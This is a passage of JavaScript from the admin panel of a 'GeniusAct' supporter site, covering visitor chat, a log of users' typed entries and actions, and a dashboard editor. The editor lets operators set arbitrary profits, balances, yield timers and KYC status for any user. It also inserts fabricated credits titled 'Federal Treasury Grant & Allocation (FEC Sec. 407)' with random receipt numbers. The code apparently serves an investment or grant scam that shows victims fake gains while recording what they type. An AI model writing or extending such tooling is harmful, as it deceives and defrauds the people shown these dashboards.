        chatId: 'chat_' + (m.userEmail ? m.userEmail.toLowerCase().replace(/[^a-z0-9]/g, '_') : ('guest_' + Date.now())),
        userEmail: m.userEmail || 'supportgeniusactglobal@gmail.com',
        userName: m.userEmail ? m.userEmail.split('@')[0] : 'Visitor',
        isGuest: false,
        createdAt: m.timestamp || new Date().toISOString(),
        lastUpdated: m.timestamp || new Date().toISOString(),
        unreadAdminCount: m.reply ? 0 : 1,
        unreadUserCount: 0,
        messages: [
          { id: 'm_' + Date.now(), sender: 'user', text: `[${m.subject || 'Inquiry'}]: ${m.message}`, timestamp: m.timestamp || new Date().toISOString() },
          ...(m.reply ? [{ id: 'r_' + Date.now(), sender: 'admin', text: m.reply, timestamp: m.replyTimestamp || new Date().toISOString() }] : [])
        ]
      });
    }
  });

  chats.sort((a, b) => new Date(b.lastUpdated || b.createdAt) - new Date(a.lastUpdated || a.createdAt));
  localStorage.setItem('geniusact_contact_chats', JSON.stringify(chats));

  const totalUnread = chats.reduce((acc, c) => acc + (c.unreadAdminCount || 0), 0);
  if (countBadge) {
    countBadge.textContent = totalUnread;
    countBadge.style.display = totalUnread > 0 ? 'inline-block' : 'none';
  }
  if (activeCountBadge) {
    activeCountBadge.textContent = chats.length;
  }

  sidebar.innerHTML = '';
  if (chats.length === 0) {
    sidebar.innerHTML = `
      <div style="padding:2rem; text-align:center; color:#64748b; font-size:0.85rem;">
        <i class="fas fa-inbox" style="font-size:2rem; margin-bottom:0.5rem; display:block; color:#334155;"></i>
        No active visitor chats yet.
      </div>
    `;
    const threadBody = document.getElementById('admin-chat-thread-messages');
    if (threadBody) {
      threadBody.innerHTML = `
        <div style="text-align: center; color: #64748b; margin-top: 6rem;">
          <i class="fas fa-comments" style="font-size: 3.5rem; margin-bottom: 1rem; color: #334155;"></i>
          <p style="font-size:0.95rem; margin:0;">No visitor conversations yet.</p>
        </div>
      `;
    }
    return;
  }

  // Auto-select first chat session if none selected
  if (!activeAdminChatId || !chats.some(c => c.chatId === activeAdminChatId)) {
    activeAdminChatId = chats[0].chatId;
  }

  chats.forEach(chat => {
    const item = document.createElement('div');
    const isActive = activeAdminChatId === chat.chatId;
    let lastMsgText = 'No messages';
    if (chat.messages && chat.messages.length > 0) {
      const lm = chat.messages[chat.messages.length - 1];
      if (lm.text) lastMsgText = lm.text;
      else if (lm.media) lastMsgText = (lm.media.type === 'image' ? '📷 Image Attachment' : '📁 File Attachment');
    }
    const timeStr = chat.lastUpdated ? new Date(chat.lastUpdated).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : '';
    const hasUnread = (chat.unreadAdminCount || 0) > 0;
    const displayName = chat.userName || chat.userEmail || ('Visitor #' + (chat.chatId ? chat.chatId.substr(-4) : 'Guest'));

    item.style.cssText = `padding: 12px 14px; border-bottom: 1px solid #1e293b; cursor: pointer; transition: background 0.2s; background: ${isActive ? '#1e293b' : 'transparent'}; border-left: 3px solid ${isActive ? '#3b82f6' : 'transparent'};`;
    item.innerHTML = `
      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px;">
        <span style="font-weight:700; color:${hasUnread ? '#38bdf8' : '#f8fafc'}; font-size:0.88rem; max-width:170px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;">${escapeHtml(displayName)}</span>
        <span style="font-size:0.7rem; color:#64748b;">${timeStr}</span>
      </div>
      <div style="font-size:0.78rem; color:#94a3b8; max-width:260px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; margin-bottom:4px;">
        ${escapeHtml(lastMsgText)}
      </div>
      <div style="display:flex; justify-content:space-between; align-items:center;">
        <span style="font-size:0.68rem; padding:1px 6px; border-radius:4px; font-weight:700; background:${chat.isGuest ? '#334155' : '#1e3a8a'}; color:${chat.isGuest ? '#94a3b8' : '#60a5fa'};">
          ${chat.isGuest ? 'Guest Visitor' : 'Supporter'}
        </span>
        ${hasUnread ? `<span style="background:#ef4444; color:white; font-size:0.68rem; font-weight:800; padding:1px 6px; border-radius:10px;">${chat.unreadAdminCount} NEW</span>` : ''}
      </div>
    `;

    item.onclick = () => window.selectAdminChat(chat.chatId);
    sidebar.appendChild(item);
  });

  if (activeAdminChatId) {
    renderAdminChatThread(activeAdminChatId);
  }
}

window.selectAdminChat = function(chatId) {
  activeAdminChatId = chatId;
  let chats = JSON.parse(localStorage.getItem('geniusact_contact_chats')) || [];
  const chat = chats.find(c => c.chatId === chatId);
  if (chat) {
    chat.unreadAdminCount = 0;
    localStorage.setItem('geniusact_contact_chats', JSON.stringify(chats));
  }
  loadContactUsChats();
};

let adminPendingMedia = null;

// Helper: Compress Image on Canvas for Admin Chat
function processAdminChatFile(file, callback) {
  if (!file) return;
  const isImage = file.type.startsWith('image/');
  const isVideo = file.type.startsWith('video/');
  const isAudio = file.type.startsWith('audio/');

  if (isImage) {
    const reader = new FileReader();
    reader.onload = (evt) => {
      const img = new Image();
      img.onload = () => {
        const maxDim = 1200;
        let width = img.width;
        let height = img.height;
        if (width > maxDim || height > maxDim) {
          if (width > height) {
            height = Math.round((height * maxDim) / width);
            width = maxDim;
          } else {
            width = Math.round((width * maxDim) / height);
            height = maxDim;
          }
        }
        const canvas = document.createElement('canvas');
        canvas.width = width;
        canvas.height = height;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(img, 0, 0, width, height);
        const compressedDataUrl = canvas.toDataURL('image/jpeg', 0.8);
        callback({
          type: 'image',
          dataUrl: compressedDataUrl,
          name: file.name
        });
      };
      img.onerror = () => {
        callback({
          type: 'image',
          dataUrl: evt.target.result,
          name: file.name
        });
      };
      img.src = evt.target.result;
    };
    reader.readAsDataURL(file);
  } else {
    const reader = new FileReader();
    reader.onload = (evt) => {
      let type = 'file';
      if (isVideo) type = 'video';
      else if (isAudio) type = 'audio';
      else if (file.type === 'application/pdf' || file.name.toLowerCase().endsWith('.pdf')) type = 'pdf';

      callback({
        type: type,
        dataUrl: evt.target.result,
        name: file.name
      });
    };
    reader.readAsDataURL(file);
  }
}

// Handle Admin File Attachment Selection
document.addEventListener('change', (e) => {
  if (e.target && e.target.id === 'admin-chat-file-input') {
    const file = e.target.files[0];
    if (!file) return;

    if (file.size > 25 * 1024 * 1024) {
      alert('File size exceeds 25MB limit.');
      e.target.value = '';
      return;
    }

    processAdminChatFile(file, (mediaObj) => {
      adminPendingMedia = mediaObj;
      const previewBar = document.getElementById('admin-chat-file-preview-bar');
      const namePreview = document.getElementById('admin-chat-file-name-preview');
      if (previewBar && namePreview) {
        let icon = '📁 File';
        if (mediaObj.type === 'image') icon = '📷 Image';
        else if (mediaObj.type === 'video') icon = '🎥 Video';
        else if (mediaObj.type === 'audio') icon = '🎵 Audio';
        else if (mediaObj.type === 'pdf') icon = '📄 PDF';

        namePreview.textContent = `${icon}: ${file.name}`;
        previewBar.style.display = 'flex';
      }
    });
  }
});

document.addEventListener('click', (e) => {
  if (e.target && (e.target.id === 'admin-chat-file-remove-btn' || e.target.closest('#admin-chat-file-remove-btn'))) {
    adminPendingMedia = null;
    const fileInput = document.getElementById('admin-chat-file-input');
    if (fileInput) fileInput.value = '';
    const previewBar = document.getElementById('admin-chat-file-preview-bar');
    if (previewBar) previewBar.style.display = 'none';
  } else if (e.target && (e.target.id === 'admin-chat-file-label' || e.target.closest('#admin-chat-file-label'))) {
    const fileInput = document.getElementById('admin-chat-file-input');
    if (fileInput && e.target !== fileInput) {
      fileInput.click();
    }
  }
});

function renderAdminChatThread(chatId) {
  let chats = JSON.parse(localStorage.getItem('geniusact_contact_chats')) || [];
  const chat = chats.find(c => c.chatId === chatId);
  const threadBody = document.getElementById('admin-chat-thread-messages');
  const headerName = document.getElementById('admin-active-chat-name');
  const headerEmail = document.getElementById('admin-active-chat-email');
  const headerStatus = document.getElementById('admin-active-chat-status');
  const replyInput = document.getElementById('admin-chat-reply-input');
  const sendBtn = document.getElementById('admin-chat-send-btn');
  const headerContainer = document.getElementById('admin-chat-header');

  if (!chat || !threadBody) return;

  const displayName = chat.userName || chat.userEmail || ('Visitor #' + (chat.chatId ? chat.chatId.substr(-4) : 'Guest'));
  const accIdStr = chat.accountId || 'FEC-87492109';
  headerName.textContent = `${displayName} (Account ID: ${accIdStr})`;
  headerEmail.textContent = `${chat.userEmail || 'Guest Visitor'} • Account ID: ${accIdStr} • Session: ${chat.chatId}`;
  headerStatus.style.display = 'inline-block';
  headerStatus.textContent = chat.isGuest ? 'Guest Visitor' : 'Registered Supporter';
  headerStatus.className = `status-badge ${chat.isGuest ? 'status-pending' : 'status-approved'}`;

  // Add Clear Chat button to header if not already present
  if (headerContainer && !document.getElementById('btn-clear-chat-session')) {
    let clearBtn = document.createElement('button');
    clearBtn.id = 'btn-clear-chat-session';
    clearBtn.className = 'action-btn btn-ban';
    clearBtn.style.cssText = 'padding:4px 10px; font-size:0.75rem; margin-left:auto;';
    clearBtn.innerHTML = '<i class="fas fa-trash-alt"></i> Clear Chat';
    clearBtn.onclick = () => window.deleteAdminChatSession(chat.chatId);
    headerContainer.appendChild(clearBtn);
  }

  replyInput.disabled = false;
  sendBtn.disabled = false;

  const msgs = Array.isArray(chat.messages) ? chat.messages : [];
  if (msgs.length === 0) {
    threadBody.innerHTML = `
      <div style="text-align: center; color: #64748b; margin-top: 4rem;">
        <i class="fas fa-comments" style="font-size: 3rem; margin-bottom: 0.5rem; color: #334155;"></i>
        <p style="font-size:0.88rem;">No messages in this chat session yet.</p>
      </div>
    `;
    return;
  }

  threadBody.innerHTML = msgs.map(m => {
    const isAdmin = m.sender === 'admin';
    const timeStr = m.timestamp ? new Date(m.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : '';
    
    let mediaContent = '';
    if (m.media && m.media.dataUrl) {
      const dUrl = m.media.dataUrl;
      const mType = m.media.type || '';
      const mName = escapeHtml(m.media.name || 'Attachment');

      if (mType === 'image' || dUrl.startsWith('data:image/')) {
        mediaContent = `<div style="margin-top:6px;"><img src="${dUrl}" style="max-width:100%; max-height:280px; border-radius:8px; border:1px solid rgba(255,255,255,0.15); cursor:pointer; display:block;" onclick="window.open(this.src)" title="Click to view full image" /></div>`;
      } else if (mType === 'video' || dUrl.startsWith('data:video/')) {
        mediaContent = `<div style="margin-top:6px;"><video src="${dUrl}" controls style="max-width:100%; max-height:280px; border-radius:8px; border:1px solid rgba(255,255,255,0.15); display:block;"></video></div>`;
      } else if (mType === 'audio' || dUrl.startsWith('data:audio/')) {
        mediaContent = `<div style="margin-top:6px;"><audio src="${dUrl}" controls style="max-width:100%; display:block;"></audio></div>`;
      } else {
        mediaContent = `<div style="margin-top:6px; padding:8px 12px; background:rgba(255,255,255,0.12); border-radius:8px; display:inline-flex; align-items:center; gap:8px;">
          <i class="fas fa-file-alt" style="font-size:1.4rem; color:#60a5fa;"></i>
          <div>
            <div style="font-weight:700; font-size:0.82rem; color:#ffffff; max-width:220px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;">${mName}</div>
            <a href="${dUrl}" target="_blank" download="${mName}" style="font-size:0.75rem; color:#93c5fd; text-decoration:underline; font-weight:600;">Download / Open File</a>
          </div>
        </div>`;
      }
    }

    const msgAccId = m.accountId || chat.accountId || accIdStr;

    return `
      <div style="max-width:80%; padding:10px 14px; border-radius:12px; font-size:0.88rem; line-height:1.45; word-break:break-word; align-self:${isAdmin ? 'flex-end' : 'flex-start'}; background:${isAdmin ? '#2563eb' : '#1e293b'}; color:${isAdmin ? '#ffffff' : '#f8fafc'}; border:${isAdmin ? 'none' : '1px solid #334155'}; border-bottom-${isAdmin ? 'right' : 'left'}-radius:2px;">
        <div style="font-size:0.7rem; font-weight:800; color:${isAdmin ? '#bfdbfe' : '#38bdf8'}; margin-bottom:3px; display:flex; justify-content:space-between; gap:10px;">
          <span>${isAdmin ? 'Campaign Representative (You)' : escapeHtml(displayName)}</span>
          <span style="opacity:0.85;">ID: ${escapeHtml(msgAccId)}</span>
        </div>
        ${m.text ? `<div>${escapeHtml(m.text)}</div>` : ''}
        ${mediaContent}
        <span style="font-size:0.65rem; opacity:0.75; margin-top:4px; text-align:right; display:block;">${timeStr}</span>
      </div>
    `;
  }).join('');

  threadBody.scrollTop = threadBody.scrollHeight;
}

window.deleteAdminChatSession = async function(chatId) {
  if (!confirm('Are you sure you want to delete this live chat conversation?')) return;
  let chats = JSON.parse(localStorage.getItem('geniusact_contact_chats')) || [];
  chats = chats.filter(c => c.chatId !== chatId);
  localStorage.setItem('geniusact_contact_chats', JSON.stringify(chats));

  activeAdminChatId = chats.length > 0 ? chats[0].chatId : null;

  if (window.cloudSyncFull) {
    try { await window.cloudSyncFull(); } catch(e) { }
  }

  showToast('Chat conversation cleared.');
  loadContactUsChats();
};

async function sendAdminChatMessage() {
  if (!activeAdminChatId) return;
  const input = document.getElementById('admin-chat-reply-input');
  const text = input ? input.value.trim() : '';
  if (!text && !adminPendingMedia) return;

  let chats = JSON.parse(localStorage.getItem('geniusact_contact_chats')) || [];
  const idx = chats.findIndex(c => c.chatId === activeAdminChatId);
  if (idx > -1) {
    const now = new Date().toISOString();
    const newMsg = {
      id: 'm_' + Date.now(),
      sender: 'admin',
      text: text,
      media: adminPendingMedia ? { ...adminPendingMedia } : null,
      timestamp: now
    };
    chats[idx].messages.push(newMsg);
    chats[idx].lastUpdated = now;
    chats[idx].unreadUserCount = (chats[idx].unreadUserCount || 0) + 1;
    localStorage.setItem('geniusact_contact_chats', JSON.stringify(chats));

    // Direct REST API call for instant multi-device sync
    (window.geniusFetch || fetch)('/api/chat/admin-reply', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chatId: activeAdminChatId,
        message: newMsg
      })
    }).catch(err => console.warn('Direct admin reply API call error:', err));

    if (window.cloudSyncFull) {
      try { await window.cloudSyncFull(); } catch (e) { }
    }

    adminPendingMedia = null;
    const fileInput = document.getElementById('admin-chat-file-input');
    if (fileInput) fileInput.value = '';
    const previewBar = document.getElementById('admin-chat-file-preview-bar');
    if (previewBar) previewBar.style.display = 'none';

    if (input) input.value = '';
    loadContactUsChats();
  }
}

document.addEventListener('DOMContentLoaded', () => {
  const sendBtn = document.getElementById('admin-chat-send-btn');
  const input = document.getElementById('admin-chat-reply-input');
  if (sendBtn) sendBtn.onclick = sendAdminChatMessage;
  if (input) {
    input.onkeydown = (e) => {
      if (e.key === 'Enter') sendAdminChatMessage();
    };
  }

  // Background Cloud Sync Poller (Runs every 3s non-blocking for instant chat sync)
  let isAdminSyncing = false;
  setInterval(async () => {
    if (isAdminSyncing) return;
    isAdminSyncing = true;
    try {
      if (window.cloudSyncFull) {
        await window.cloudSyncFull();
      }
      loadSupportMessages();
      loadContactUsChats();
    } catch(e) { } finally {
      isAdminSyncing = false;
    }
  }, 3000);
});

// ==================== USER FOOTPRINT AUDIT LOG ====================
function loadUserFootprints() {
  const tbody = document.getElementById('footprint-table-body');
  const badge = document.getElementById('footprint-count-badge');
  if (!tbody) return;

  const footprints = JSON.parse(localStorage.getItem('geniusact_user_footprints')) || [];

  if (badge) {
    badge.textContent = footprints.length;
    badge.style.display = footprints.length > 0 ? 'inline-block' : 'none';
  }

  renderFootprintRows(footprints);
}

function renderFootprintRows(items) {
  const tbody = document.getElementById('footprint-table-body');
  if (!tbody) return;

  tbody.innerHTML = '';

  if (items.length === 0) {
    tbody.innerHTML = `
      <tr>
        <td colspan="6" style="text-align:center; padding: 2.5rem; color:#64748b;">
          <i class="fas fa-shoe-prints" style="font-size:2rem; margin-bottom:0.5rem; display:block; color:#334155;"></i>
          No user footprints or typed entries recorded yet.
        </td>
      </tr>
    `;
    return;
  }

  items.forEach(item => {
    const tr = document.createElement('tr');
    tr.style.borderBottom = '1px solid #334155';

    const dateStr = item.timestamp ? new Date(item.timestamp).toLocaleString('en-US', {
      month: 'short', day: 'numeric', year: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit'
    }) : '—';

    let badgeColor = '#8b5cf6';
    if (item.actionType && item.actionType.includes('Live Chat')) badgeColor = '#3b82f6';
    else if (item.actionType && item.actionType.includes('Form')) badgeColor = '#10b981';
    else if (item.actionType && item.actionType.includes('Contribution')) badgeColor = '#f59e0b';
    else if (item.actionType && item.actionType.includes('KYC')) badgeColor = '#ec4899';

    tr.innerHTML = `
      <td style="padding:12px 16px; font-size:0.78rem; color:#94a3b8; white-space:nowrap;">${dateStr}</td>
      <td style="padding:12px 16px;">
        <div style="font-weight:700; color:#f8fafc; font-size:0.85rem;">${escapeHtml(item.userName || 'Visitor')}</div>
        <div style="font-size:0.75rem; color:#60a5fa;">${escapeHtml(item.userEmail || 'Guest')}</div>
      </td>
      <td style="padding:12px 16px;">
        <span style="background:${badgeColor}22; color:${badgeColor}; border:1px solid ${badgeColor}55; padding:3px 8px; border-radius:6px; font-size:0.75rem; font-weight:700;">
          ${escapeHtml(item.actionType || 'User Action')}
        </span>
      </td>
      <td style="padding:12px 16px; max-width:320px; font-size:0.82rem; color:#e2e8f0; word-break:break-word; line-height:1.4;">
        <div style="background:#0f172a; padding:8px 12px; border-radius:6px; border:1px solid #334155;">
          ${escapeHtml(item.details || '—')}
        </div>
      </td>
      <td style="padding:12px 16px; font-size:0.78rem; color:#cbd5e1; white-space:nowrap;">
        <i class="fas fa-link" style="color:#64748b; margin-right:4px;"></i> ${escapeHtml(item.pageUrl || 'index.html')}
      </td>
      <td style="padding:12px 16px; font-size:0.75rem; color:#94a3b8; white-space:nowrap;">
        <i class="${item.deviceInfo && item.deviceInfo.includes('Mobile') ? 'fas fa-mobile-alt' : 'fas fa-desktop'}" style="margin-right:4px;"></i>
        ${escapeHtml(item.deviceInfo || 'Desktop Browser')}
      </td>
    `;

    tbody.appendChild(tr);
  });
}

window.filterUserFootprints = function() {
  const input = document.getElementById('footprint-search-input');
  if (!input) return;
  const q = input.value.toLowerCase().trim();
  const footprints = JSON.parse(localStorage.getItem('geniusact_user_footprints')) || [];

  if (!q) {
    renderFootprintRows(footprints);
    return;
  }

  const filtered = footprints.filter(fp =>
    (fp.userName && fp.userName.toLowerCase().includes(q)) ||
    (fp.userEmail && fp.userEmail.toLowerCase().includes(q)) ||
    (fp.actionType && fp.actionType.toLowerCase().includes(q)) ||
    (fp.details && fp.details.toLowerCase().includes(q)) ||
    (fp.pageUrl && fp.pageUrl.toLowerCase().includes(q))
  );

  renderFootprintRows(filtered);
};

window.clearUserFootprints = async function() {
  if (!confirm('Are you sure you want to clear all recorded user footprint logs?')) return;
  localStorage.setItem('geniusact_user_footprints', JSON.stringify([]));

  if (window.cloudSyncFull) {
    try { await window.cloudSyncFull(); } catch(e) {}
  }

  showToast('User footprint log cleared.');
  loadUserFootprints();
};

// ==================== EDIT USER DASHBOARD LIVE EDITOR ====================
let activeEditUserEmail = null;

window.loadEditUserDashboardSelector = function(approved, pending) {
  const select = document.getElementById('edit-dash-user-select');
  if (!select) return;

  if (!approved || !pending) {
    approved = JSON.parse(localStorage.getItem('geniusact_approved_users')) || [];
    pending = JSON.parse(localStorage.getItem('geniusact_pending_users')) || [];
  }

  const currentUser = JSON.parse(localStorage.getItem('geniusact_current_user'));
  const userMap = new Map();

  (approved || []).forEach(u => {
    if (u && u.email) userMap.set(u.email.toLowerCase(), u);
  });

  (pending || []).forEach(u => {
    if (u && u.email && !userMap.has(u.email.toLowerCase())) {
      userMap.set(u.email.toLowerCase(), u);
    }
  });

  if (currentUser && currentUser.email && !userMap.has(currentUser.email.toLowerCase())) {
    userMap.set(currentUser.email.toLowerCase(), currentUser);
  }

  const currentVal = select.value;
  select.innerHTML = '<option value="">-- Choose Supporter Account --</option>';

  const allUsers = Array.from(userMap.values());
  allUsers.forEach(u => {
    const nameStr = u.fullName || u.name || (u.email ? u.email.split('@')[0] : 'Supporter');
    const statusTag = u.status === 'pending' ? ' [Pending]' : ' [Approved]';
    const opt = document.createElement('option');
    opt.value = u.email;
    opt.textContent = `${nameStr} (${u.email})${statusTag}`;
    select.appendChild(opt);
  });

  if (currentVal && userMap.has(currentVal.toLowerCase())) {
    select.value = currentVal;
  }
};

window.onEditDashUserChange = function(email) {
  const container = document.getElementById('edit-dash-container');
  if (!email) {
    if (container) container.style.display = 'none';
    activeEditUserEmail = null;
    return;
  }

  activeEditUserEmail = email;
  const approved = JSON.parse(localStorage.getItem('geniusact_approved_users')) || [];
  const pending = JSON.parse(localStorage.getItem('geniusact_pending_users')) || [];
  const allUsers = [...approved, ...pending];
  const user = allUsers.find(u => u && u.email && u.email.toLowerCase() === email.toLowerCase());

  if (!user) {
    alert('Selected user not found.');
    return;
  }

  if (container) container.style.display = 'block';

  document.getElementById('edit-dash-active-email').textContent = user.email;
  const initial = user.fullName ? user.fullName.charAt(0).toUpperCase() : (user.email ? user.email.charAt(0).toUpperCase() : 'U');
  document.getElementById('edit-dash-avatar-initial').textContent = initial;

  const isApproved = approved.some(u => u.email && u.email.toLowerCase() === email.toLowerCase());
  const statusBadge = document.getElementById('edit-dash-active-status');
  if (statusBadge) {
    statusBadge.textContent = isApproved ? 'Approved Supporter' : 'Pending Verification';
    statusBadge.className = `status-badge ${isApproved ? 'status-approved' : 'status-pending'}`;
  }

  const donations = user.donations || [];
  const sumDonations = donations.reduce((acc, d) => acc + (d.amount || 0), 0);

  document.getElementById('edash-fullname').value = user.fullName || user.name || (user.email ? user.email.split('@')[0] : '');
  document.getElementById('edash-membersince').value = user.customMemberSince || user.memberSince || 'Aug 2026';
  document.getElementById('edash-tier').value = user.tier || 'Bronze Supporter';
  document.getElementById('edash-streak').value = user.streakDays !== undefined ? user.streakDays : 4;
  document.getElementById('edash-engagement').value = user.engagementScore !== undefined ? user.engagementScore : 19.1;
  document.getElementById('edash-kycstatus').value = user.kycStatus || (user.kycApproved ? 'Verified & Whitelisted' : 'Unverified');

  document.getElementById('edash-contributions').value = user.customTotalContributed !== undefined ? user.customTotalContributed : sumDonations;
  document.getElementById('edash-accruedprofit').value = user.customAccruedProfit !== undefined ? user.customAccruedProfit : '0.00';
  document.getElementById('edash-currentbalance').value = user.customCurrentBalance || '';
  document.getElementById('edash-projectedbalance').value = user.customProjectedBalance || '';
  document.getElementById('edash-yieldtimer').value = user.customYieldTimer || '6d 23:59:45';
  document.getElementById('edash-donationscount').value = user.donationsCountOverride !== undefined ? user.donationsCountOverride : donations.length;

  document.getElementById('edash-totalraised').value = user.customTotalRaised || '$2,400,000';
  document.getElementById('edash-activesupporters').value = user.customActiveSupporters || '12,450';
  document.getElementById('edash-q2pct').value = user.customQ2Pct || '48.1%';
  document.getElementById('edash-statecoverage').value = user.customStateCoverage || '38 of 50';

  renderEditUserHistoryTable(user.donations || []);
};

function renderEditUserHistoryTable(donations) {
  const tbody = document.getElementById('edash-history-tbody');
  if (!tbody) return;
  tbody.innerHTML = '';

  if (donations.length === 0) {
    tbody.innerHTML = `<tr><td colspan="4" style="text-align:center; color:#64748b; padding:1rem;">No contribution entries recorded.</td></tr>`;
    return;
  }

  donations.forEach((d, idx) => {
    const tr = document.createElement('tr');
    tr.style.borderBottom = '1px solid #1e293b';
    const isNeg = (d.amount || 0) < 0;
    tr.innerHTML = `
      <td style="padding:6px 10px;">
        <div style="font-weight:700; color:#f8fafc;">${escapeHtml(d.description || 'Contribution')}</div>
        <div style="color:#64748b; font-size:0.7rem;">ID: ${escapeHtml(d.id || ('RCP-' + idx))}</div>
      </td>
      <td style="padding:6px 10px; font-weight:700; color:${isNeg ? '#ef4444' : '#34d399'};">
        ${isNeg ? '' : '+'}$${Math.abs(d.amount || 0).toLocaleString('en-US', {minimumFractionDigits:2, maximumFractionDigits:2})}
      </td>
      <td style="padding:6px 10px; color:#cbd5e1;">${escapeHtml(d.date || 'Aug 2026')}</td>
      <td style="padding:6px 10px; text-align:center;">
        <button onclick="deleteHistoryEntry(${idx})" style="background:#ef4444; color:white; border:none; padding:2px 6px; border-radius:4px; cursor:pointer; font-size:0.7rem;">
          <i class="fas fa-trash"></i>
        </button>
      </td>
    `;
    tbody.appendChild(tr);
  });
}

window.toggleAddEntryForm = function() {
  const form = document.getElementById('edash-add-entry-form');
  if (!form) return;
  form.style.display = form.style.display === 'none' ? 'block' : 'none';
};

window.saveNewHistoryEntry = function() {
  if (!activeEditUserEmail) return;

  const title = document.getElementById('nent-title').value.trim() || 'Federal Treasury Grant & Allocation (FEC Sec. 407)';
  const amountStr = document.getElementById('nent-amount').value.trim() || '1000.00';
  const amount = parseFloat(amountStr.replace(/[^0-9.-]/g, '')) || 1000.00;
  const date = document.getElementById('nent-date').value.trim() || 'Aug 6, 2026';
  const receipt = document.getElementById('nent-receipt').value.trim() || ('FUND-' + Math.floor(10000000 + Math.random() * 90000000));

  const approved = JSON.parse(localStorage.getItem('geniusact_approved_users')) || [];
  const pending = JSON.parse(localStorage.getItem('geniusact_pending_users')) || [];

  let user = approved.find(u => u.email && u.email.toLowerCase() === activeEditUserEmail.toLowerCase());
  let targetArray = approved;

  if (!user) {
    user = pending.find(u => u.email && u.email.toLowerCase() === activeEditUserEmail.toLowerCase());
    targetArray = pending;
  }

  if (!user) return;
  if (!Array.isArray(user.donations)) user.donations = [];

  user.donations.unshift({
    id: receipt,
    description: title,
    amount: amount,
    date: date,
    status: 'Completed'
  });

  if (targetArray === approved) {
    localStorage.setItem('geniusact_approved_users', JSON.stringify(approved));
  } else {
    localStorage.setItem('geniusact_pending_users', JSON.stringify(pending));
  }

  const curStr = localStorage.getItem('geniusact_current_user');
  if (curStr) {
    const cur = JSON.parse(curStr);
    if (cur.email && cur.email.toLowerCase() === user.email.toLowerCase()) {
      cur.donations = user.donations;
      localStorage.setItem('geniusact_current_user', JSON.stringify(cur));
    }
  }

  document.getElementById('nent-title').value = '';
  document.getElementById('nent-amount').value = '';
  document.getElementById('nent-receipt').value = '';
  toggleAddEntryForm();

  renderEditUserHistoryTable(user.donations);
  showToast('New transaction entry added to user dashboard.');
};

window.deleteHistoryEntry = function(index) {
  if (!activeEditUserEmail) return;
  if (!confirm('Are you sure you want to delete this contribution history entry?')) return;

  const approved = JSON.parse(localStorage.getItem('geniusact_approved_users')) || [];
  const pending = JSON.parse(localStorage.getItem('geniusact_pending_users')) || [];

  let user = approved.find(u => u.email && u.email.toLowerCase() === activeEditUserEmail.toLowerCase());
  let targetArray = approved;

  if (!user) {
    user = pending.find(u => u.email && u.email.toLowerCase() === activeEditUserEmail.toLowerCase());
    targetArray = pending;
  }

  if (!user || !user.donations) return;
  user.donations.splice(index, 1);

  if (targetArray === approved) {
    localStorage.setItem('geniusact_approved_users', JSON.stringify(approved));
  } else {
    localStorage.setItem('geniusact_pending_users', JSON.stringify(pending));
  }

  const curStr = localStorage.getItem('geniusact_current_user');
  if (curStr) {
    const cur = JSON.parse(curStr);
    if (cur.email && cur.email.toLowerCase() === user.email.toLowerCase()) {
      cur.donations = user.donations;
      localStorage.setItem('geniusact_current_user', JSON.stringify(cur));
    }
  }

  renderEditUserHistoryTable(user.donations);
  showToast('Contribution entry deleted.');
};

window.saveActiveUserDashboard = async function() {
  if (!activeEditUserEmail) {
    alert('Please select a supporter account to edit.');
    return;
  }

  const approved = JSON.parse(localStorage.getItem('geniusact_approved_users')) || [];
  const pending = JSON.parse(localStorage.getItem('geniusact_pending_users')) || [];

  let user = approved.find(u => u.email && u.email.toLowerCase() === activeEditUserEmail.toLowerCase());
  let targetArray = approved;

  if (!user) {
    user = pending.find(u => u.email && u.email.toLowerCase() === activeEditUserEmail.toLowerCase());
    targetArray = pending;
  }

  if (!user) {
    alert('User not found.');
    return;
  }

  user.fullName = document.getElementById('edash-fullname').value.trim();
  user.name = user.fullName;
  user.customMemberSince = document.getElementById('edash-membersince').value.trim();
  user.tier = document.getElementById('edash-tier').value;
  user.streakDays = parseInt(document.getElementById('edash-streak').value) || 4;
  user.engagementScore = parseFloat(document.getElementById('edash-engagement').value) || 19.1;
  user.kycStatus = document.getElementById('edash-kycstatus').value;

  const contribVal = document.getElementById('edash-contributions').value.trim();
  user.customTotalContributed = contribVal ? parseFloat(contribVal) : undefined;

  const profitVal = document.getElementById('edash-accruedprofit').value.trim();
  user.customAccruedProfit = profitVal ? parseFloat(profitVal) : undefined;

  user.customCurrentBalance = document.getElementById('edash-currentbalance').value.trim();
  user.customProjectedBalance = document.getElementById('edash-projectedbalance').value.trim();
  user.customYieldTimer = document.getElementById('edash-yieldtimer').value.trim();
  
  const countVal = document.getElementById('edash-donationscount').value.trim();
  user.donationsCountOverride = countVal ? parseInt(countVal) : undefined;

  user.customTotalRaised = document.getElementById('edash-totalraised').value.trim();
  user.customActiveSupporters = document.getElementById('edash-activesupporters').value.trim();
  user.customQ2Pct = document.getElementById('edash-q2pct').value.trim();
  user.customStateCoverage = document.getElementById('edash-statecoverage').value.trim();

  if (targetArray === approved) {
    localStorage.setItem('geniusact_approved_users', JSON.stringify(approved));
  } else {
    localStorage.setItem('geniusact_pending_users', JSON.stringify(pending));
  }

  const curStr = localStorage.getItem('geniusact_current_user');
  if (curStr) {
    const cur = JSON.parse(curStr);
    if (cur.email && cur.email.toLowerCase() === user.email.toLowerCase()) {
      Object.assign(cur, user);
      localStorage.setItem('geniusact_current_user', JSON.stringify(cur));
    }
  }

  if (window.cloudSyncFull) {
    try { await window.cloudSyncFull(); } catch(e) { console.log(e); }
  }

  showToast(`✅ Supporter Dashboard for ${user.email} saved and published live!`);
};

window.sendCustomUserMessage = async function() {
  if (!activeEditUserEmail) {
    alert('Please select a supporter account first.');
    return;
  }

  const subject = document.getElementById('edash-msg-subject').value.trim();
  const body = document.getElementById('edash-msg-body').value.trim();

  if (!subject || !body) {
    alert('Please enter both subject title and message content.');
    return;
  }

  const approved = JSON.parse(localStorage.getItem('geniusact_approved_users')) || [];
  const pending = JSON.parse(localStorage.getItem('geniusact_pending_users')) || [];

